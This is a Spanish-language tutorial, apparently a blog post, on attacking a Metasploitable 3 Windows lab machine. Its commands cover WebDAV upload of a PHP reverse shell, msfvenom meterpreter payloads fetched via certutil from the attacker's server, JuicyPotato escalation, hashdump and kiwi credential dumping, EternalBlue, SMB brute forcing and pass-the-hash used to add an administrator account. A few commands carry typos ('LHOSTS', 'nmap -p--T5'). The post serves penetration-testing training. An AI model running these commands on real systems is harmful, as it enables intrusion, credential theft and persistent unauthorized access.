---
title: "Análsis de Vulnerabilidades y Explotación"
date: 2026-03-28 17:39:00 -0500
categories: [Hacking, Vulnerabilidades, Explotación]
tags: [cracking, enumeración, Nmap, Metasploit, Hydra y CrackMapExec]
description: Cómo enumerar usuarios y crackear contraseñas de servicios vulnerables.
---

En este artículo, analizaremos distintas metodologías para identificar y explotar vulnerabilidades en sistemas Windows. Para nuestra práctica, utilizaremos la máquina Metasploitable 3, un entorno diseñado con múltiples servicios vulnerables que nos permite poner a prueba habilidades de enumeración y escalada de privilegios.

## 1. Escaneo de Puertos y Enumeración | Windows
El primer paso es identificar la superficie de ataque del host objetivo.

### Reconocimiento inicial
Comenzamos verificando la conectividad y realizando un escaneo rápido de todos los puertos abiertos:
```shell
# Verificar conectividad
ping dominio.local

# Escaneo rápido de todos los puertos (65535)
nmap -p- -T5 dominio.local
```

### Enumeración detallada de servicios
Una vez identificados los puertos, realizamos un análisis profundo de versiones y scripts predeterminados

```shell
nmap -p--T5 -sV -sC -n dominio.local --stats-every 3
```

> Si el sitio utiliza WordPress o servicios específicos, recuerda mapear la IP y el dominio en tu archivo /etc/hosts para que el navegador resuelva correctamente las rutas internas..
{: .prompt-tip }

Para identificar nombres de host y detalles del protocolo SMB, utilizamos CrackMapExec (o su sucesor, NetExec):

```shell
crackmapexec smb dominio.local
```

## 2. Explotación Web: Vulnerabilidad WebDAV
Al navegar por el puerto 8585 (http://dominio.local:8585/uploads), detectamos que el directorio /uploads podría tener habilitado el método PUT.

Con nmap podemos hacer un escaneo de http-enum, cuyo formato es el siguiente:

```shell
nmap -p 8585 --script http-enum -sV dominio.local
```

Este comando permite saber que folders permiten recabar información.

### Pruebas con Davtest
Usamos davtest para verificar automáticamente qué extensiones de archivos permite subir y ejecutar el servidor:

```shell
davtest -sendbd -auto -url http://dominio.local:8585/uploads
```
¿Qué estamos haciendo con estos parámetros?

* -url: Define el directorio objetivo donde WebDAV está activo.
* -sendbd: Envía archivos que contienen "backdoors" simples para verificar si el servidor interpreta el código.
* -auto: Automatiza la subida de una amplia biblioteca de extensiones para determinar qué filtros de seguridad tiene el servidor.

### Metodología de la Herramienta
El funcionamiento de davtest es ingenioso: crea un directorio temporal dentro de /uploads e intenta cargar una ráfaga de ficheros con distintas extensiones (como .php, .txt, .html, .asp, entre otros).

La verdadera potencia de esta herramienta no es solo decirnos qué archivos se subieron, sino confirmar cuáles son ejecutables. Si el reporte final indica que los scripts .php se ejecutan correctamente, tenemos el camino libre para subir una Reverse Shell y tomar el control del servidor.

### Subida de Archivos con Cadaver
Podemos usar una shell de PHP ya lista en Kali Linux, para ello podemos buscar las propias reverse shell que existen dentro de linux o acceder a repositorios github para buscar reverse shell listas:

```shell
# Búsqueda en linux
locate php-rev
more /usr/share/laudanum/php/php-reverse-shell.php

#Búsqueda en Linux para cualquier Sistema Operativo.
http://github.com/ckiller2HM/scripts/blob/main/php-rev-shell.php
```

Los pasos para cargar la shell son los siguientes:

```shell
ping dominio.local -I eth0
arp-scan -I eth1 --localnet
#Buscar cuál es la interfaz que tiene conexión con el dominio.

#Conectarse vía WebDAV y subir el archivo
cadaver http://dominio.local:8585/uploads
dav:/uploads/> help
dav:/uploads/> put php-rev-shell.php
```

### Estableciendo la Conexión
Preparamos un listener con Netcat en nuestra máquina atacante y ejecutamos el script desde el navegador o davtest:

```shell
nc -nlvp 8765
```

## 3. Post-Explotación y Escalada de Privilegios
Una vez dentro de la CMD de Windows, recolectamos información crítica:

Ahora detallaremos los comándos útiles que podemos emplear en una cmd de Windows
* systeminfo > Información general del sistema y parches faltantes.
* Whoami > Permite saber cómo está ejecutanto la información el usuario, si tenemos acceso al root sería lo ideal.
* net user usuariodeprueba password /add > Si tenemos los permisos, podremos crear un usuario de prueba.
* whoami /priv > Se puede ver los privilegios que posee dicho usuario.
    * SeImpersonatePrivilege > Un privilegio importante, el cual permite personificar un servicio u otro usuario. Si se tiene habilitado, se puede escalar privilegios a través de distintos binarios. El más útil se llama JuicyPotato.exe o GodPotato.exe o con un módulo de Metasploit.
### Migración a Metasploit (Meterpreter)
Para una gestión más avanzada, migramos nuestra shell básica a una sesión de Meterpreter.

* En linux se debe generar el payload mediante MSFVENOM o revshells.com
    * **[Revshells](https://revshells.com)**: Permite construir la línea de msfvenom para crear una revershell y poder escalar privilegios.

#### 1. Generar el Payload e iniciar el servidor:
```shell
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOSTS=<TU_IP> LPORT=1234 -f exe -o reverse.exe
python3 -m http.server 80
```
> Advertencia: La IP que va en LHOSTS debe ser de la máquina que está atacando.
{: .prompt-warning }

#### 2. Transferir el archivo: 
Levantamos un servidor en Python y usamos certutil.exe en la máquina víctima:

```shell
c:\\Windows\Temp\ > certutil.exe -f -split -urlcache http://<TU_IP>/reverse.exe reverse.exe
```

#### 3.Ejecutar el Handler:
Con la shell de arriba se logra traer el programa reverse.exe a la máquina Windows y se queda a la espera hasta que msfconsole esté a la escucha.

En Metasploit, configuramos el multi/handler y ejecutamos reverse.exe en la víctima.
```shell
msfconsole -q
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST eth1
set LPORT 5321
run

meterpreter> getprivs #privilegios que tiene el usuario
meterpreter> getuid #Permite ver que usuario soy
meterpreter> getsystem #Permite escalar privilegios

Ctrl+Z # Permite hacer un backgroud de la sessión
sessions -i 1 # Permite regresar a la sesión
```
## 4. Extracción de Credenciales y Movimiento Lateral
Dentro de Meterpreter, podemos automatizar la búsqueda de vulnerabilidades de escalada:

```shell
use post/multi/recon/local_exploit_suggester
set session 1
run #Con esto se puede saber todos los módulos que permiten explotar la máquina

use exploit/windows/local/ms16_075/reflection/juicy
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 4923
set session 1
exploit #abre una segunda sessión
```
### Dumpeo de Hashes
Si logramos privilegios de administrador, extraemos los hashes de las cuentas locales:
```shell
meterpreter > hashdump
```
Para descifrar los hashes NTLM obtenidos, puedes usar John the Ripper o servicios online como CrackStation:

> Advertencia: Crackstation solo descifra la segunda parte del hash.
{: .prompt-tip }

#### Extraer datos de hashes
```shell
cat hashes.txt | cut -d ":" -f 4 #-f es el número de cámpo
```
#### Descifrar con CrackStation
**[Crackstation](https://crackstation.com)**: Descifra los hashes que sean cómunes y no complejos.

#### Descifrar con John the ripper
```shell
john hashes.txt --format=NT
```
#### Pass-the-Hash (PtH)
Si no logras descifrar el hash pero tienes el valor NTLM, puedes autenticarte directamente:

```shell
crackmapexec smb dominio.local -u Administrador -H "NThash_aqui" -x "whoami"
```
#### Módulos útiles de msfconsole
```shell
meterpreter > load kiwi #permite sacar información de credenciales en equipos antiguos que tengan en texto en plano
meterpreter > help
meterpreter > creds_all 
meterpreter > lsa_dump_sam #formato para hacer pass the hash

meterpreter > load incognito #Permite acceder si el usuario no tiene el permiso de SeImpersonatePrivilege
meterpreter > list_tokens -u
```

## 5. Otras Vulnerabilidades Comunes SMB

```shell
ls usr/share/nmap/scripts/ | grep smb #permite ver todos los scripts que tienen smb*
nmap -p 445,139 --script smb-vuln* dominio.local
```

### SMB: EternalBlue (MS17-010)
Si el puerto 445 es vulnerable, Metasploit tiene un módulo directo:
```shell
msfconsole -q
> search type:exploit name:eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS dominio.local
set LPORT 1234
run

meterpreter > getuid
meterpreter > hashdump
```

Ahora es importante sacar solo los usuarios
```shell
cat hashes.txt | cut -d ":" -f 1 >> users.txt
nmap -p 445 --script smb-brute --script-args userdb=users.txt,passdb=users.txt dominio.local

gzip -d /usr/share/wordlists/rockyou.txt.gz
crackmapexec smb dominio.local -u users.txt -p /usr/share/wordlists/rockyou.txt --continue-on-success
```

### RDP: BlueKeep (CVE-2019-0708)
Para escaneo de vulnerabilidades en Escritorio Remoto:
```shell
msfconsole -q
search bluekeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set rhosts dominio.local
run
```
> Advertencia: Al probar BlueKeep, utiliza solo el scanner. El exploit puede causar una Pantalla Azul (BSOD) en el objetivo
{: .prompt-warning }

### Vulnerabilidad Pass the hash

```shell
msfconsole -q
search exploit/windows/smb/psexec #Herramienta para hacer una conexión similar a ssh
set rhosts dominio.local
set lport 1253
set SMBUSER Administrator
set SMBPASS hashlargo3:haslargo4
exploit
```

Ahora se procede a ejecutar la misma vulnerabilidad con el hash pero con la herramienta crackmapexec
```shell
crackmapexec smb dominio.local -u usuario -H "hashlargo4" -x "whoami"
(Pwn3d!) #Significa que si puedo conectarme con ese hash.
crackmapexec smb dominio.local -u usuario -H "hashlargo4" -x "net user prueba password /add"
crackmapexec smb dominio.local -u usuario -H "hashlargo4" -x "net localgroup administrators prueba /add"
crackmapexec smb dominio.local -u usuario -p password

rdesktop dominio.local #para conectarse con el nuevo usuario creado
```

## Conclusión
La explotación en Windows requiere una metodología clara: desde una enumeración minuciosa hasta el aprovechamiento de privilegios mal configurados como SeImpersonate. ¡A seguir practicando en laboratorios controlados!
